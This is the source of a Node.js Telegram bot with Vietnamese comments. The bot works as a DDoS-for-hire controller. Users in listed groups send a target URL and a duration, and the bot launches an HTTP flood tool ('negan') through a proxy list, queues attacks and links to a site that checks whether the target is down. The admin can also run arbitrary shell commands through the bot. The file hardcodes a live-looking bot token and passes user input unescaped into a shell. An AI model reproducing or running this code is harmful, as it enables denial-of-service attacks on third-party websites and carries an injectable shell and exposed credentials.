const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([
    -1002423723717, // Thay thế bằng group ID thực tế
    987654321,      // Thay thế bằng group ID thực tế
    112233445,      // Thay thế bằng group ID thực tế
    556677889,      // Thay thế bằng group ID thực tế
    998877665       // Thay thế bằng group ID thực tế
]);
const maxConcurrentAttacks = 3; // Số lệnh tối đa có thể chạy đồng thời
const maxSlot = 1;              // Số lệnh tối đa mỗi người dùng có thể chạy cùng lúc
const maxTimeAttacks = 120;     // Thời gian tối đa cho mỗi lệnh (giây)

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(); // Lưu trữ tiến trình của từng người dùng
const attackQueue = [];           // Hàng đợi các lệnh chờ thực thi

// Thông báo bot đã sẵn sàng
let isBotReady = true;
bot.sendMessage(adminId, '[Version PRO] 🤖 Bot đã sẵn sàng nhận lệnh.');
console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');

// Hàm gửi thông báo dưới dạng HTML
const sendHtmlMessage = async (chatId, message) => {
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

// Hàm thực thi lệnh
const executeCommand = async (chatId, command, host, time, username) => {
    const startTime = new Date().toLocaleString();
    const message = `🚀 <b>Đang thực thi lệnh:</b>\n<code>${command}</code>\n<b>Người gọi lệnh:</b> ${username}\n<b>Thời gian bắt đầu:</b> ${startTime}`;
    await sendHtmlMessage(chatId, message);

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        const endTime = new Date().toLocaleString();
        const completeMessage = `✅ <b>Tiến trình hoàn tất:</b>\n<code>${command}</code>\n<b>Người gọi lệnh:</b> ${username}\n<b>Thời gian bắt đầu:</b> ${startTime}\n<b>Thời gian kết thúc:</b> ${endTime}\n<a href="https://check-host.net/check-http?host=${host}">Check Host</a>`;
        sendHtmlMessage(chatId, completeMessage);

        // Xóa lệnh khỏi danh sách đang chạy
        currentAttacks.delete(chatId);
        if (attackQueue.length > 0) {
            const nextAttack = attackQueue.shift();
            executeCommand(nextAttack.chatId, nextAttack.command, nextAttack.host, nextAttack.time, nextAttack.username);
        }
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return sendHtmlMessage(chatId, '🚫 <b>Bạn không có quyền thực hiện lệnh này.</b>');

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return sendHtmlMessage(chatId, '🚫 <b>Sai định dạng! Nhập theo:</b> <code>&lt;URL&gt; &lt;time&gt;</code>');
        const [host, time] = parts;
        if (time > maxTimeAttacks) return sendHtmlMessage(chatId, `🚫 <b>Thời gian tối đa là ${maxTimeAttacks} giây.</b>`);

        // Kiểm tra số lệnh đang chạy của người dùng
        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
        if (userAttacks >= maxSlot) return sendHtmlMessage(chatId, '🚫 <b>Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất.</b>');

        // Kiểm tra số lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return sendHtmlMessage(chatId, '⏳ <b>Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...</b>');
        }

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        currentAttacks.set(chatId, { user: chatId, command });
        executeCommand(chatId, command, host, time, username);
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return sendHtmlMessage(chatId, '🚫 <b>Lệnh không được để trống. Ví dụ:</b> <code>exe ls</code>');
        const child = exec(command, { shell: '/bin/bash' });
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => sendHtmlMessage(chatId, `<b>🚀 Kết quả lệnh:</b>\n<code>${command}</code>\n<pre>${output}</pre>`));
        return;
    }

    // Lệnh không hợp lệ
    sendHtmlMessage(chatId, '🚫 <b>Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.</b>');
});
